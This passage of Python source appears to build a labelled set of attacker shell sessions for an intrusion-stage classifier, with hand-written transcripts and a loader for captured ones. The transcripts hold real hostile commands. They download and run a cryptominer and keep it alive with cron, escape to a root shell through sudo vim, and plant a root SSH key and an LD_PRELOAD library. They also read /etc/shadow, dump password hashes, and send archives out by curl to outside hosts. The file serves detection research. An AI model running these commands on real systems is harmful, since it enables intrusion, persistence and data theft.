    Transcript("miner_install_full", "test", "bot", "a miner unpacked in shared memory and kept alive by cron", (
        ("cd /dev/shm", N), ("wget -q http://198.51.100.200/xm.tgz", N), ("tar xzf xm.tgz", N),
        ("./xmrig -o pool.example.org:443 -k --tls -B", N), ("echo '@reboot /dev/shm/xmrig -B' | crontab -", S),
        ("cat /proc/cpuinfo | grep -c processor", R),
    )),
    Transcript("hands_on_recon_long", "test", "human", "a long look around that ends in the exports", (
        ("w", R), ("ps -eo user,pid,cmd --sort=user | head -30", R), ("ss -tnp", R), ("ls -la /etc/cron.d", R),
        ("cat /etc/cron.d/erp-report", R), ("ls -la /srv/exports", R),
        ("head -n 5 /srv/exports/students_2026_provisional.csv", X),
    )),
    Transcript("sudo_vim_root_key", "test", "human", "root via sudo vim, then a key for root", (
        ("sudo -l", P), ("sudo vim -c ':!/bin/sh'", P),
        ("mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOp op@vps' >> /root/.ssh/authorized_keys", S),
        ("chmod 600 /root/.ssh/authorized_keys", N), ("exit", N),
    )),
    Transcript("rsync_pull_and_ship", "test", "human", "the app pulled from erp-web, searched, then shipped out", (
        ("cat ~/.ssh/known_hosts", R), ("rsync -avz deploy@erp-web:/opt/erp/ /tmp/.erp/", L),
        ("grep -rn -i 'password' /tmp/.erp | head", R), ("tar czf /tmp/.erp.tgz /tmp/.erp", X),
        ("curl -s -T /tmp/.erp.tgz ftp://203.0.113.70/in/", X),
    )),
    Transcript("container_disk_mount", "test", "human", "a privileged container mounting the host's disk", (
        ("cat /proc/1/cgroup", R), ("fdisk -l 2>/dev/null | head", R),
        ("mkdir /mnt/h && mount /dev/sda1 /mnt/h", P), ("chroot /mnt/h /bin/bash", P), ("cat /etc/shadow", P),
    )),
    Transcript("split_and_upload", "test", "human", "an archive chunked and uploaded piece by piece", (
        ("tar czf /tmp/.f.tgz /srv/erp-content", X), ("split -b 5M /tmp/.f.tgz /tmp/.f.part.", X),
        ("for f in /tmp/.f.part.*; do curl -s -F \"f=@$f\" https://203.0.113.90/u; done", X),
        ("rm -f /tmp/.f*", N),
    )),
    Transcript("ld_preload_rootkit", "test", "human", "a preload library installed for every process", (
        ("gcc -shared -fPIC -o /usr/lib/libsys.so /tmp/h.c", N),
        ("echo /usr/lib/libsys.so > /etc/ld.so.preload", S), ("ls -la /etc/ld.so.preload", R),
    )),
    Transcript("bot_password_then_look", "test", "bot", "password changed first, questions asked later", (
        ("echo 'root:9xQ!vRt2' | chpasswd", S), ("uname -a", R), ("cat /proc/meminfo | head -2", R), ("nproc", R),
    )),
    Transcript("postgres_walkthrough", "test", "human", "PostgreSQL listed, explored, and copied out", (
        ("psql -h 10.60.0.31 -U app -l", R), ("psql -h 10.60.0.31 -U app -d appdb -c '\\dt'", R),
        ("psql -h 10.60.0.31 -U app -d appdb -c 'select email, password_hash from users'", X),
        ("psql -h 10.60.0.31 -U app -d appdb -c 'copy (select * from users) to stdout' > /tmp/.u.csv", X),
    )),
)


def resolved_labels(steps: tuple[tuple[str, Optional[str]], ...]) -> list[str]:
    """Each step's stage, with `N` steps taking the stage they occur in.

    A neutral step inherits from the step before it; neutral steps at the very
    start of a session take the first stage that follows them.
    """
    labels: list[Optional[str]] = []
    current: Optional[str] = None
    for _, label in steps:
        current = label or current
        labels.append(current)
    first = next((label for label in labels if label), None)
    if first is None:
        raise ValueError("a transcript needs at least one labelled step")
    return [label or first for label in labels]


#: How a step's stage is written in captured_sessions.json.
LABEL_CODES: dict[str, Optional[str]] = {"R": R, "P": P, "S": S, "L": L, "X": X, "N": N}
SPLITS = ("dev", "test", "holdout")
CAPTURED_PATH = Path(__file__).with_name("captured_sessions.json")


def load_captured(path: Path = CAPTURED_PATH) -> tuple[Transcript, ...]:
    """The labelled captured sessions in `path`, as transcripts.

    Raises ValueError on anything malformed rather than skipping it: a
    session silently left out of a holdout changes the number it reports.
    """
    if not path.exists():
        return ()
    transcripts = []
    for session in json.loads(path.read_text(encoding="utf-8")).get("sessions", []):
        name = session.get("name", "<unnamed>")
        try:
            steps = tuple(
                (str(step["command"]), LABEL_CODES[str(step["label"]).upper()]) for step in session["steps"]
            )
            stamps = tuple(str(step["timestamp"]) for step in session["steps"])
            weight = int(session.get("sessions", 1))
            transcript = Transcript(name, session["split"], session["tempo"], session["source"], steps, stamps, weight)
        except KeyError as missing:
            raise ValueError(
                f"{path.name}: session {name}: a missing field or a label outside R P S L X N ({missing})"
            ) from None
        if transcript.split not in SPLITS or transcript.tempo not in ("bot", "human"):
            raise ValueError(f"{path.name}: session {name}: split must be one of {SPLITS}, tempo bot or human")
        if len(steps) < 2:
            raise ValueError(f"{path.name}: session {name} has fewer than two steps")
        try:
            resolved_labels(steps)
        except ValueError:
            raise ValueError(f"{path.name}: every step of session {name} is N") from None
        transcripts.append(transcript)
    return tuple(transcripts)


TRANSCRIPTS: tuple[Transcript, ...] = HAND_WRITTEN + load_captured()
